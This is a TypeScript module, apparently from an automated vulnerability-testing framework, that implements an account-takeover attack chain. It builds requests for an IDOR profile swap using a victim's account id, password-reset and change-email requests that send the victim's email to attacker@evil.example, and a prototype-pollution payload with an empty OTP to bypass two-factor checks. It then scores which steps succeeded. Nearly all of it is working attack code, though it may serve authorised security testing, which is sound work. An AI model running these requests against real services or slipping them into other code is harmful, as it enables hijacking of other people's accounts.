/**
 * atoChain — Account Takeover Chain primitive.
 *
 * Chains the highest-payout authz/authn bypass steps into a full account
 * takeover (ATO) proof:
 *   1. IDOR -> profile swap:   PUT/PATCH the account/profile endpoint, swapping
 *      the victim's account id field while the ACTOR session is authenticated.
 *      If accepted, the actor has hijacked the victim's profile/account.
 *   2. Reset/email bypass:      POST to a password-reset / change-email endpoint
 *      WITHOUT owning the target account. If a reset token is not bound to the
 *      session, the victim's credentials get reset by the actor.
 *   3. 2FA / prototype bypass:  attempt an action that SHOULD require a second
 *      factor, but send a prototype-pollution / missing-otp body. If the action
 *      still succeeds, 2FA is bypassable.
 *
 * Every verdict is status/behavior-authoritative (see `assessAccess` in
 * framework.ts) and gated by the EvidenceGate — no substring guessing.
 */

import type {
  TechniquePrimitive,
  TechniqueContext,
  AttackStep,
  StepExecutionResult,
  PrimitiveResult,
} from './framework'
import { claimFor, assessAccess } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

/** Split an endpoint URL into origin + path-base (everything before last segment). */
function baseOf(url: string): { origin: string; pathBase: string } {
  try {
    const u = new URL(url)
    const seg = u.pathname.split('/').filter(Boolean)
    seg.pop()
    const pathBase = seg.length ? '/' + seg.join('/') : ''
    return { origin: u.origin, pathBase }
  } catch {
    return { origin: '', pathBase: url }
  }
}

export const atoChain: TechniquePrimitive = {
  id: 'atoChain',
  name: 'Account Takeover Chain',
  technique: 'auth-bypass',
  description:
    'Chains IDOR -> email-change -> password-reset with 2FA / prototype-chain bypass to prove full account takeover (ATO).',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    // Need an authenticated foothold (a session OR a known role set) to chain.
    return !!(ctx.sessionHeaders || (ctx.roles && ctx.roles.length > 0))
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const baseUrl = ctx.endpoint?.url ?? ctx.target!
    const { origin, pathBase } = baseOf(baseUrl)
    const actorHeaders = { ...(ctx.sessionHeaders ?? {}) }
    const victim = ctx.altObjectId ?? ctx.param ?? 'VICTIM'
    const victimEmail = `${victim.toLowerCase()}@victim.example`

    const steps: AttackStep[] = []

    // 1. IDOR -> profile/account swap with the actor session.
    const swapMethod = ctx.endpoint?.method?.toUpperCase() === 'POST' ? 'POST' : 'PUT'
    steps.push({
      id: 'ato-profile-swap',
      description: `Actor session swaps victim account id (${victim}) into ${baseUrl} (IDOR -> profile takeover)`,
      request: {
        method: swapMethod,
        url: baseUrl,
        headers: actorHeaders,
        body: JSON.stringify({
          id: victim,
          accountId: victim,
          userId: victim,
          email: victimEmail,
        }),
      },
      expectedSignal: 'profile/account update accepted for a victim id under the actor session',
      metadata: { kind: 'profile-swap', victim },
    })

    // 2. Password-reset / change-email without owning the target.
    steps.push({
      id: 'ato-reset',
      description: `Reset/change-email for ${victimEmail} without owning the account (${origin}${pathBase}/reset-password)`,
      request: {
        method: 'POST',
        url: `${origin}${pathBase}/reset-password`,
        headers: actorHeaders,
        body: JSON.stringify({ email: victimEmail, userId: victim }),
      },
      expectedSignal: 'reset token issued / email changed without session ownership',
      metadata: { kind: 'reset', victim },
    })
    steps.push({
      id: 'ato-change-email',
      description: `Change-email for victim to attacker-controlled address (${origin}${pathBase}/change-email)`,
      request: {
        method: 'POST',
        url: `${origin}${pathBase}/change-email`,
        headers: actorHeaders,
        body: JSON.stringify({ email: victimEmail, newEmail: 'attacker@evil.example' }),
      },
      expectedSignal: 'email changed without confirming current credential/2FA',
      metadata: { kind: 'reset', victim },
    })

    // 3. 2FA / prototype-chain bypass on a privileged account action.
    steps.push({
      id: 'ato-2fa',
      description: `Privileged action sent with prototype-pollution / missing-otp body (${origin}${pathBase}/account/email)`,
      request: {
        method: 'POST',
        url: `${origin}${pathBase}/account/email`,
        headers: actorHeaders,
        body: JSON.stringify({ __proto__: { '2fa': 'bypassed' }, otp: '', userId: victim }),
      },
      expectedSignal: 'action succeeds despite missing/forged 2FA evidence',
      metadata: { kind: '2fa', victim },
    })

    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const swap = results.find(r => r.step.metadata?.kind === 'profile-swap')
    const resets = results.filter(r => r.step.metadata?.kind === 'reset')
    const twofa = results.find(r => r.step.metadata?.kind === '2fa')

    const granted = (r: StepExecutionResult | undefined): boolean => {
      if (!r) return false
      const a = assessAccess({ status: r.status, body: r.body, setCookie: r.headers?.['set-cookie'] })
      return a.granted && !a.denied
    }

    const swapWin = granted(swap)
    const resetWin = resets.some(granted)
    const twofaWin = granted(twofa)

    const rep: StepExecutionResult | undefined = swapWin
      ? swap
      : resetWin
        ? resets.find(granted)
        : twofaWin
          ? twofa
          : undefined

    const { verified } = rep
      ? evidenceGate.verifyClaim(claimFor('ato', rep.step.request.url, rep.status, rep.step.request.method))
      : { verified: false }

    const confirmed = (swapWin || resetWin || twofaWin) && verified

    const evidence = results
      .filter(r => (r.status ?? 0) >= 200 && (r.status ?? 0) < 400)
      .map(r => ({
        kind: 'response' as const,
        label: `${r.step.request.method} ${r.step.request.url} → ${r.status}`,
        data: (r.body ?? '').slice(0, 1200),
      }))
    if (swapWin && swap) evidence.unshift({
      kind: 'response' as const,
      label: `profile-swap ${swap.step.request.method} ${swap.step.request.url} → ${swap.status}`,
      data: (swap.body ?? '').slice(0, 1200),
    })

    const severity = swapWin || resetWin ? 'critical' : twofaWin ? 'high' : undefined

    return {
      confirmed,
      confidence: confirmed ? (severity === 'critical' ? 0.92 : 0.78) : 0.1,
      evidence,
      severity,
      finding: confirmed
        ? {
            category: 'account_takeover',
            description:
              `Account takeover chain on target: ` +
              `${swapWin ? 'IDOR profile-swap accepted; ' : ''}` +
              `${resetWin ? 'password-reset/change-email not session-bound; ' : ''}` +
              `${twofaWin ? '2FA/prototype-chain bypass accepted; ' : ''}`.trim(),
            request: rep!.step.request,
            response: { status: rep!.status ?? 0, body: (rep!.body ?? '').slice(0, 1000) },
            cwe: severity === 'critical' ? 'CWE-640' : 'CWE-287',
          }
        : undefined,
      note: `swapWin=${swapWin} resetWin=${resetWin} twofaWin=${twofaWin} verified=${verified}`,
    }
  },
}
